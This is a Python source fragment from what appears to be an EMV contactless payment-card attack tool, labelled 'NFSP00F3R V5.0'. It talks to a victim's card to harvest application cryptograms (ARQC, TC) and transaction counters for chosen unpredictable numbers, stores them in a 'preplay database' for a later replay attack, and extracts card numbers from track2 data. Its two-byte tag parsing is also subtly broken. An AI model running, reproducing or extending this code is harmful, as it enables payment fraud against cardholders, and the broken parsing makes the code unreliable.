            select_aid = [0x00, 0xA4, 0x04, 0x00, len(aid_bytes)] + list(aid_bytes)
            
            response, sw1, sw2 = connection.transmit(select_aid)
            return sw1 == 0x90 and sw2 == 0x00
            
        except Exception as e:
            self.logger.error(f"Failed to select application {aid}: {e}")
            return False
    
    def _perform_preplay_transaction(self, connection, aid: str, amount: str) -> Optional[Dict]:
        """
        Perform a full EMV transaction to generate cryptogram data for preplay.
        
        Args:
            connection: Card connection
            aid: Application ID
            amount: Transaction amount (12 digits)
            
        Returns:
            Dictionary with UN, ATC, ARQC, TC data or None if failed
        """
        try:
            import os
            import time
            
            # Generate transaction data
            un = os.urandom(4).hex().upper()  # Unpredictable Number
            transaction_date = time.strftime("%y%m%d")
            transaction_time = time.strftime("%H%M%S")
            
            # Build CDOL data for GPO
            cdol_data = self._build_cdol_data(amount, un, transaction_date, transaction_time)
            
            # Send GPO (Get Processing Options)
            gpo_command = [0x80, 0xA8, 0x00, 0x00, len(cdol_data)] + list(cdol_data)
            response, sw1, sw2 = connection.transmit(gpo_command)
            
            if sw1 != 0x90 or sw2 != 0x00:
                self.logger.debug(f"GPO failed: {sw1:02X}{sw2:02X}")
                return None
            
            # Parse GPO response to get AIP and AFL
            aip, afl = self._parse_gpo_response(response)
            if not aip or not afl:
                self.logger.debug("Failed to parse GPO response")
                return None
            
            # Read application data as specified by AFL
            self._read_afl_records(connection, afl)
            
            # Generate ARQC with GENERATE AC command
            arqc_data = self._generate_arqc(connection, amount, un, transaction_date, transaction_time)
            if not arqc_data:
                return None
            
            # Simulate authorization and generate TC
            tc_data = self._generate_tc(connection, arqc_data['atc'])
            
            return {
                'un': un,
                'atc': arqc_data.get('atc'),
                'arqc': arqc_data.get('arqc'),
                'tc': tc_data.get('tc') if tc_data else None,
                'amount': amount,
                'transaction_date': transaction_date,
                'transaction_time': transaction_time
            }
            
        except Exception as e:
            self.logger.error(f"Transaction simulation failed: {e}")
            return None
    
    def _build_cdol_data(self, amount: str, un: str, date: str, time: str) -> bytes:
        """Build CDOL data for GPO command."""
        try:
            # Standard CDOL data template
            cdol_data = bytearray()
            
            # Amount, Authorized (9F02) - 6 bytes
            cdol_data.extend(bytes.fromhex(amount))
            
            # Amount, Other (9F03) - 6 bytes  
            cdol_data.extend(b'\x00\x00\x00\x00\x00\x00')
            
            # Terminal Country Code (9F1A) - 2 bytes
            cdol_data.extend(b'\x08\x40')  # USD
            
            # Transaction Date (9A) - 3 bytes
            cdol_data.extend(bytes.fromhex(date))
            
            # Transaction Time (9F21) - 3 bytes
            cdol_data.extend(bytes.fromhex(time))
            
            # Transaction Type (9C) - 1 byte
            cdol_data.extend(b'\x00')  # Purchase
            
            # Unpredictable Number (9F37) - 4 bytes
            cdol_data.extend(bytes.fromhex(un))
            
            return bytes(cdol_data)
            
        except Exception as e:
            self.logger.error(f"Failed to build CDOL data: {e}")
            return b''
    
    def _parse_gpo_response(self, response: List[int]) -> Tuple[Optional[bytes], Optional[bytes]]:
        """Parse GPO response to extract AIP and AFL."""
        try:
            if not response or len(response) < 4:
                return None, None
                
            # Format 1: TLV format
            if response[0] == 0x77:
                # Parse TLV data
                return self._parse_tlv_gpo_response(response[1:])
            
            # Format 2: Primitive format
            elif response[0] == 0x80:
                length = response[1]
                if len(response) < length + 2:
                    return None, None
                    
                data = response[2:2+length]
                if len(data) >= 4:
                    aip = bytes(data[0:2])
                    afl = bytes(data[2:])
                    return aip, afl
                    
            return None, None
            
        except Exception as e:
            self.logger.error(f"Failed to parse GPO response: {e}")
            return None, None
    
    def _parse_tlv_gpo_response(self, data: List[int]) -> Tuple[Optional[bytes], Optional[bytes]]:
        """Parse TLV format GPO response."""
        try:
            aip = None
            afl = None
            
            i = 0
            while i < len(data):
                if i + 1 >= len(data):
                    break
                    
                tag = data[i]
                length = data[i + 1]
                
                if i + 2 + length > len(data):
                    break
                    
                value = bytes(data[i + 2:i + 2 + length])
                
                if tag == 0x82:  # AIP
                    aip = value
                elif tag == 0x94:  # AFL
                    afl = value
                    
                i += 2 + length
                
            return aip, afl
            
        except Exception as e:
            self.logger.error(f"Failed to parse TLV GPO response: {e}")
            return None, None
    
    def _read_afl_records(self, connection, afl: bytes):
        """Read application data records as specified by AFL."""
        try:
            # Parse AFL to get record addresses
            i = 0
            while i < len(afl):
                if i + 3 >= len(afl):
                    break
                    
                sfi = (afl[i] >> 3) & 0x1F
                start_record = afl[i + 1]
                end_record = afl[i + 2]
                
                # Read records
                for record_num in range(start_record, end_record + 1):
                    read_record = [0x00, 0xB2, record_num, (sfi << 3) | 0x04, 0x00]
                    response, sw1, sw2 = connection.transmit(read_record)
                    # Records are read for transaction context, response not processed here
                    
                i += 4
                
        except Exception as e:
            self.logger.debug(f"AFL record reading failed (non-critical): {e}")
    
    def _generate_arqc(self, connection, amount: str, un: str, date: str, time: str) -> Optional[Dict]:
        """Generate ARQC using GENERATE AC command."""
        try:
            # Build transaction data for GENERATE AC
            ac_data = self._build_cdol_data(amount, un, date, time)
            
            # GENERATE AC command for ARQC (P1=0x80)
            generate_ac = [0x80, 0xAE, 0x80, 0x00, len(ac_data)] + list(ac_data)
            
            response, sw1, sw2 = connection.transmit(generate_ac)
            
            if sw1 == 0x90 and sw2 == 0x00 and response:
                # Parse response to extract cryptogram and ATC
                return self._parse_generate_ac_response(response)
                
            return None
            
        except Exception as e:
            self.logger.error(f"ARQC generation failed: {e}")
            return None
    
    def _generate_tc(self, connection, atc: str) -> Optional[Dict]:
        """Generate TC using second GENERATE AC command."""
        try:
            # Build authorization response data (simulated approval)
            auth_data = bytearray()
            auth_data.extend(b'\x8A\x02\x30\x30')  # Auth Response Code: "00" (approved)
            
            # GENERATE AC command for TC (P1=0x40)
            generate_ac = [0x80, 0xAE, 0x40, 0x00, len(auth_data)] + list(auth_data)
            
            response, sw1, sw2 = connection.transmit(generate_ac)
            
            if sw1 == 0x90 and sw2 == 0x00 and response:
                # Parse response to extract TC
                return self._parse_generate_ac_response(response)
                
            return None
            
        except Exception as e:
            self.logger.debug(f"TC generation failed (normal): {e}")
            return None
    
    def _parse_generate_ac_response(self, response: List[int]) -> Optional[Dict]:
        """Parse GENERATE AC response to extract cryptogram and ATC."""
        try:
            result = {}
            
            # Parse TLV response
            i = 0
            while i < len(response):
                if i + 1 >= len(response):
                    break
                    
                tag = response[i]
                length = response[i + 1]
                
                if i + 2 + length > len(response):
                    break
                    
                value = bytes(response[i + 2:i + 2 + length])
                
                if tag == 0x9F26:  # Application Cryptogram
                    result['arqc'] = value.hex().upper()
                elif tag == 0x9F36:  # Application Transaction Counter
                    result['atc'] = value.hex().upper()
                elif tag == 0x9F27:  # Cryptogram Information Data
                    result['cid'] = value.hex().upper()
                    
                i += 2 + length
                
            return result if result else None
            
        except Exception as e:
            self.logger.error(f"Failed to parse GENERATE AC response: {e}")
            return None
    
    def _save_preplay_database(self):
        """Save preplay database to file."""
        try:
            if not self.attack_manager or not self.preplay_database_path:
                return
                
            # Export preplay database to JSON
            preplay_data = []
            for un, entry in self.attack_manager.preplay_db.items():
                preplay_data.append({
                    'un': entry.un,
                    'atc': entry.atc,
                    'arqc': entry.arqc,
                    'tc': entry.tc,
                    'aac': entry.aac,
                    'amount': entry.amount,
                    'currency': entry.currency,
                    'timestamp': entry.timestamp
                })
            
            import json
            with open(self.preplay_database_path, 'w') as f:
                json.dump({
                    'version': '1.0',
                    'generated_by': 'NFSP00F3R V5.0',
                    'entries': preplay_data
                }, f, indent=2)
                
            self.logger.info(f"Preplay database saved to: {self.preplay_database_path}")
            
        except Exception as e:
            self.logger.error(f"Failed to save preplay database: {e}")


def extract_pan_from_track2(track2_data: str) -> Optional[str]:
    """
    Extract PAN from track2 data.
    
    Args:
        track2_data: Track2 data string
        
    Returns:
        Extracted PAN or None if not found
    """
    if not track2_data:
        return None
    
    try:
        # Track2 format: PAN + separator + expiry + service code + discretionary data
        # Separator is usually '=' or 'D'
        if '=' in track2_data:
            pan = track2_data.split('=')[0]
        elif 'D' in track2_data:
            pan = track2_data.split('D')[0]
        else:
            # Try to extract digits from the beginning
            match = re.match(r'^(\d{13,19})', track2_data)
            if match:
                pan = match.group(1)
            else:
                return None
        
        # Validate PAN length
        if 13 <= len(pan) <= 19 and pan.isdigit():
            return pan
        
        return None
        
    except Exception:
        return None

def generate_card_id(pan: str = None, expiry: str = None, aid: str = None) -> str:
    """
    Generate a unique card ID from card data.
    
    Args:
        pan: Primary Account Number
        expiry: Expiry date
        aid: Application Identifier
        
    Returns:
        Unique card identifier
    """
    id_data = ""
    
    if pan:
        id_data += pan
    if expiry:
        id_data += expiry
    if aid:
        id_data += aid
    
    if not id_data:
        id_data = str(datetime.now().timestamp())
    
    hash_obj = hashlib.md5(id_data.encode('utf-8'))
    return hash_obj.hexdigest()[:12]
